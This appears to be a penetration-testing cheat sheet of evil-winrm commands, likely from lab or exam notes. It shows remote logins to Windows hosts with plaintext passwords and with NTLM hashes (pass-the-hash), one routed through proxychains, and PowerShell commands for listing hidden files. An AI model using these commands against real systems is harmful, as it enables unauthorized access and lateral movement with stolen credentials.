```
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```

```
proxychains evil-winrm -i $IP -u $username -H $NTLMhash
```

```
evil-winrm -i <remoteIP> -u 'username' -p 'password'
```

```
gci -recurse .
```

```
gci -hidden
```

```
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

**NTLM hash** --> LMhash:NThash

```
evil-winrm -i 172.31.3.6 -u administrator -H NThash
```
